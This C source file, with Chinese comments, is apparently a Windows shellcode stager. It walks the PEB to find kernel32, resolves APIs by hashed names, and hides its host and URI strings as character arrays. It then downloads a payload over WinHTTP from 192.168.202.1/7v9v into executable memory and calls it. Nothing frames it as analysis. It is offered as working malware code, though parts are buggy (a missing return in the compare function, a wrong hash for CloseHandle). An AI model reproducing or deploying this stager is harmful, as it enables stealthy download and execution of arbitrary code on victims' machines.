#include "Shellcode.h"


void MyEntry() {
	APIINTERFACE ai;

	DWORD szGetProcAddr = 0x0afdf8b8;
	DWORD szLoadLibraryA = 0x0148be54;
	char szNet[] = { 'w','i','n','h','t','t','p','\0' };
	DWORD dwWinHttpOpen = 0x1EE28DD2;
	DWORD dwWinHttpConnect = 0x6AA6CABA;
	DWORD dwWinHttpOpenRequest = 0xC1120FDF;
	DWORD dwWinHttpSendRequest = 0xDBC8ED3D;
	DWORD dwWinHttpReceiveResponse = 0x45BF9A40;
	DWORD dwVirtualAlloc = 0x00293836;
	DWORD dwWinHttpQueryHeaders = 0xD76419FE;
	DWORD dwWinHttpReadData = 0xD894705C;
	DWORD dwWinHttpCloseHandle = 0xC61F7844;
	
	HMODULE hKernel32 = GetKernel32Base();
	ai.pfnLoadLibrary = (FN_LoadLibraryA)MyGetProcAddress(hKernel32, szLoadLibraryA);
	ai.pfnGetProcAddress = (FN_GetProcAddress)MyGetProcAddress(hKernel32, szGetProcAddr);
	ai.pfnVirtualAlloc = (FN_VirtualAlloc)MyGetProcAddress(hKernel32, dwVirtualAlloc);

	HMODULE hHttp = ai.pfnLoadLibrary(szNet);
	//ai.pfnMessageBoxA = (FN_MessageBoxA)MyGetProcAddress(hNet, dwInternetOpenA);
	ai.pfnWinHttpOpen = (FN_WinHttpOpen)MyGetProcAddress(hHttp, dwWinHttpOpen);
	ai.pfnWinHttpConnect = (FN_WinHttpConnect)MyGetProcAddress(hHttp, dwWinHttpConnect);
	ai.pfnWinHttpOpenRequest = (FN_WinHttpOpenRequest)MyGetProcAddress(hHttp, dwWinHttpOpenRequest);
	ai.pfnWinHttpSendRequest = (FN_WinHttpSendRequest)MyGetProcAddress(hHttp, dwWinHttpSendRequest);
	ai.pfnWinHttpReceiveResponse = (FN_WinHttpReceiveResponse)MyGetProcAddress(hHttp, dwWinHttpReceiveResponse);
	ai.pfnWinHttpQueryHeaders = (FN_WinHttpQueryHeaders)MyGetProcAddress(hHttp, dwWinHttpQueryHeaders);
	ai.pfnWinHttpReadData = (FN_WinHttpReadData)MyGetProcAddress(hHttp, dwWinHttpReadData);
	ai.pfnWinHttpCloseHandle = (FN_WinHttpCloseHandle)MyGetProcAddress(hHttp, dwWinHttpReadData);

	//ip和port
	wchar_t szHost[] = { '1','9','2','.','1','6','8','.','2','0','2','.','1','\0' };
	wchar_t szURI[] = { '/', '7', 'v', '9', 'v','\0' };
	//char szPort[] = { '8','0','\0' };
	WORD nPort = 80;
	char Agent[] = { 'M','o','z','i,','l','l','a','\0'};
	wchar_t requestType[] = { 'G','E','T','\0' };
	wchar_t Head[] = {'H','E','A','D','\0'};
	wchar_t HttpVer[] = { 'H','T','T','P','/','1','.','1','\0' };

	//ai.pfnMessageBoxA(NULL,szTitle,szHello,MB_OK);
	HINTERNET hSession = NULL;
	hSession = ai.pfnWinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);

	HINTERNET hConnect = NULL;
	hConnect = ai.pfnWinHttpConnect(hSession, szHost, nPort, 0);

	HINTERNET hHttpRequest = NULL;
	hHttpRequest = ai.pfnWinHttpOpenRequest(hConnect, Head, szURI, HttpVer,WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
	ai.pfnWinHttpSendRequest(hHttpRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
	ai.pfnWinHttpReceiveResponse(hHttpRequest, 0);

	DWORD dwContentSize = 0;
	DWORD dwIndex = 0;
	DWORD dwSize = 0x4;
	ai.pfnWinHttpQueryHeaders(hHttpRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwContentSize, &dwSize, &dwIndex);
	//ai.pfnWinHttpCloseHandle(hHttpRequest);

	hHttpRequest = ai.pfnWinHttpOpenRequest(hConnect, requestType, szURI, HttpVer, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
	ai.pfnWinHttpSendRequest(hHttpRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
	ai.pfnWinHttpReceiveResponse(hHttpRequest, 0);


	LPVOID pDll = NULL;
	DWORD dwRead = 0;
	pDll = ai.pfnVirtualAlloc(NULL, dwContentSize + 1, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	ai.pDllBuffer = pDll;

	//*(DWORD*)pDll = (DWORD)0x1;
	ai.pfnWinHttpReadData(hHttpRequest, pDll, dwContentSize + 1, &dwRead);

	__asm {
		call ai.pDllBuffer;
	}
}

//获取函数名的hash
DWORD GetProcHash(char* lpProcName) {
	char* p = lpProcName;
	DWORD result = 0;
	do {
		result = (result << 7) - result;
		result += *p;
	} while (*p++ );

	return result;
}

//比较字符串
BOOL MyStrcmp(DWORD str1, char* str2) {

	if (str1 == GetProcHash(str2)) {
		return 0;
	}
}

//获取kernel32基址
HMODULE GetKernel32Base() {
	HMODULE hKer32 = NULL;
	_asm {
		mov eax, fs: [0x18] ;//找到teb
		mov eax, [eax + 0x30];//peb
		mov eax, [eax + 0x0c];//PEB_LDR_DATA
		mov eax, [eax + 0x0c];//LIST_ENTRY 主模块
		mov eax, [eax];//ntdll
		mov eax, [eax];//kernel32
		mov eax, dword ptr[eax + 0x18];//kernel32基址
		mov hKer32, eax
	}
	return hKer32;
}

//获得函数地址
DWORD MyGetProcAddress(HMODULE hModule, DWORD lpProcName) {
	DWORD dwProcAddress = 0;
	PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)((DWORD)pDosHdr + pDosHdr->e_lfanew);
	//获取导出表
	PIMAGE_EXPORT_DIRECTORY pExtTbl = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHdr + pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	//解析导出表
	//获取函数地址数组
	PDWORD pAddressOfFunc = (PDWORD)((DWORD)hModule + pExtTbl->AddressOfFunctions);
	//获取名字数组
	PDWORD pAddressOfName = (PDWORD)((DWORD)hModule + pExtTbl->AddressOfNames);
	//获取序号导出表
	PWORD pAddressOfNameOrdinal = (PWORD)((DWORD)hModule + pExtTbl->AddressOfNameOrdinals);

	//判断序号或字符串导出
	if ((DWORD)lpProcName & 0xffff0000)
	{
		//通过名称获取导出地址
		DWORD dwSize = pExtTbl->NumberOfNames;
		for (DWORD i = 0; i < dwSize; i++)
		{
			//获取名称字符串
			DWORD dwAddrssOfName = (DWORD)hModule + pAddressOfName[i];
			//判断名称
			int nRet = MyStrcmp(lpProcName, (char*)dwAddrssOfName);
			if (nRet == 0)
			{
				//名称一致则通过名称序号表获得序号
				WORD wHint = pAddressOfNameOrdinal[i];
				//根据序号获得函数地址
				dwProcAddress = (DWORD)hModule + pAddressOfFunc[wHint];
				return dwProcAddress;
			}
		}
		//找不到则地址为0
		dwProcAddress = 0;
	}
	else
	{
		//通过序号获取导出地址
		DWORD nId = (DWORD)lpProcName - pExtTbl->Base;
		dwProcAddress = (DWORD)hModule + pAddressOfFunc[nId];
	}
	return dwProcAddress;
}

